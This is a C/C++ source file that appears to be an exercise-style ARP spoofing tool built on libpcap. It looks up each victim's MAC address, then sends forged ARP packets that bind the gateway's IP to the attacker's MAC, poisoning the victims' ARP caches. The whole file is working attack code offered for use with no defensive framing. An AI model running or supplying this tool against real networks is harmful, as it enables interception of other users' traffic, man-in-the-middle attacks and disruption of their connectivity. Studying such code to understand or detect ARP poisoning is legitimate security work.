extern "C" {
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
}
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include "header.h"
#include <map>
#include <string>
void usage() {
    printf("syntax: arp_spoofing <interface> <sender ip> <target ip>\n");
    printf("sample: arp_spoofing wlan0 192.168.10.2 192.168.1\n");
}

typedef struct {
    const char* dev_;
} Param;

Param param = {
        .dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc % 2 == 1) {
        usage();
        return false;
    }
    return true;
}

void get_my_ip_address(char* ip) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    const char* iface = param.dev_;
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, strlen(iface));
    ifr.ifr_name[strlen(iface)] = '\0'; // Ensure null termination

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    inet_ntop(AF_INET, &((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr, ip, INET_ADDRSTRLEN);

    close(sockfd);
}


void get_my_mac_address(uint8_t* mac) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    struct ifreq ifr;
    const char* iface = param.dev_;

    strncpy(ifr.ifr_name, iface, strlen(iface));
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sockfd);
}

void create_arp_request_packet(u_char* packet, char* src_ip,uint8_t* src_mac, char* dst_ip) {

    struct eth_header* eth_hdr = (struct eth_header*)packet;
    struct arp_header* arp_hdr = (struct arp_header*)(packet + sizeof(struct eth_header));

    memcpy(eth_hdr->src_mac, src_mac, 6);
    memset(eth_hdr->dst_mac, 0xff, 6);
    eth_hdr->type = htons(0x0806);

    arp_hdr->hardware_type = htons(1);
    arp_hdr->proto_type = htons(0x0800);
    arp_hdr->hardware_len = 6;
    arp_hdr->proto_len = 4;
    arp_hdr->opcode = htons(ARP_REQUEST);
    memcpy(arp_hdr->src_mac, src_mac, 6);
    inet_pton(AF_INET, src_ip, arp_hdr->src_ip);
    memset(arp_hdr->dst_mac, 0x00, 6);
    inet_pton(AF_INET, dst_ip, arp_hdr->dst_ip);
}

void create_spoofing_request_packet(u_char* packet, char* victim_ip, char* gateway_ip,  uint8_t* victim_mac, uint8_t* attacker_mac) {

    struct eth_header* eth_hdr = (struct eth_header*)packet;
    struct arp_header* arp_hdr = (struct arp_header*)(packet + sizeof(struct eth_header));

    memcpy(eth_hdr->src_mac,attacker_mac, 6);
    memcpy(eth_hdr->dst_mac,victim_mac , 6);
    eth_hdr->type = htons(0x0806);

    arp_hdr->hardware_type = htons(1);
    arp_hdr->proto_type = htons(0x0800);
    arp_hdr->hardware_len = 6;
    arp_hdr->proto_len = 4;
    arp_hdr->opcode = htons(ARP_REQUEST);
    memcpy(arp_hdr->src_mac, attacker_mac, 6);
    inet_pton(AF_INET,gateway_ip , arp_hdr->src_ip);
    memcpy(arp_hdr->dst_mac, victim_mac, 6);
    inet_pton(AF_INET, victim_ip, arp_hdr->dst_ip);
}

bool isArp(struct eth_header* eth_hdr) {
    return ntohs(eth_hdr->type) == 0x0806;
}

bool ismypacket(struct arp_header* arp_hdr, char* src_ip, char* dst_ip) {
    char arp_src_ip[INET_ADDRSTRLEN];
    char arp_dst_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, arp_hdr->src_ip, arp_src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, arp_hdr->dst_ip, arp_dst_ip, INET_ADDRSTRLEN);

    if (strncmp(arp_src_ip, src_ip, INET_ADDRSTRLEN) == 0) {
        if (strncmp(arp_dst_ip, dst_ip, INET_ADDRSTRLEN) == 0)
            return true;
        else return false;
    }
    else return false;
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;
    param.dev_ = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    char my_ip[INET_ADDRSTRLEN];
    get_my_ip_address(my_ip);
    uint8_t my_mac[6];
    get_my_mac_address(my_mac);
    int cur = 2;
    std::map< std::string ,uint8_t*> m;

    while (cur < argc) {
        char src_ip[INET_ADDRSTRLEN];
        strncpy(src_ip, argv[cur], INET_ADDRSTRLEN);
        char dst_ip[INET_ADDRSTRLEN];
        strncpy(dst_ip, argv[cur+1], INET_ADDRSTRLEN);
        uint8_t src_mac[6];

	if(m.find(std::string(src_ip))!= m.end()){

		memcpy(src_mac,m.find(src_ip)->second,6);
	}

	else{
	struct pcap_pkthdr* header;
        u_char* request_packet = (u_char*)malloc(sizeof(struct eth_header) + sizeof(struct arp_header));
        create_arp_request_packet(request_packet, my_ip, my_mac,src_ip);

        if (pcap_sendpacket(pcap, request_packet, PACKET_SIZE) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
            return -1;
        }
        printf("ARP Request Packet is successfully sent\n");


        const u_char* reply_packet;
        int res;
        while ((res = pcap_next_ex(pcap, &header, &reply_packet)) >= 0) {
            if (res == 0) continue; //timeout
            struct eth_header* eth_hdr = (struct eth_header*)reply_packet;
            struct arp_header* arp_hdr = (struct arp_header*)(reply_packet + sizeof(struct eth_header));
            if (!isArp(eth_hdr))
                continue;
            if (ismypacket(arp_hdr, src_ip, my_ip)) {
                memcpy(src_mac, arp_hdr->src_mac, 6);
		m.insert({std::string(src_ip),src_mac});
                printf("Src MAC address: ");
                for (int i = 0; i < 6; i++) {
                    printf("%02x", src_mac[i]);
                    if (i < 5) printf(":");
                }
                printf("\n");
                break;

            }
        }
	}


       u_char* arp_spoofing_packet = (u_char*)malloc(sizeof(struct eth_header) + sizeof(struct arp_header));
       create_spoofing_request_packet(arp_spoofing_packet, src_ip, dst_ip, src_mac,my_mac);
       if (pcap_sendpacket(pcap, arp_spoofing_packet, PACKET_SIZE) != 0) {
           fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
           return -1;
       }
       printf("ARP Spoofing Packet is successfully sent\n");

       cur += 2;

    }

    pcap_close(pcap);
    return 0;
}

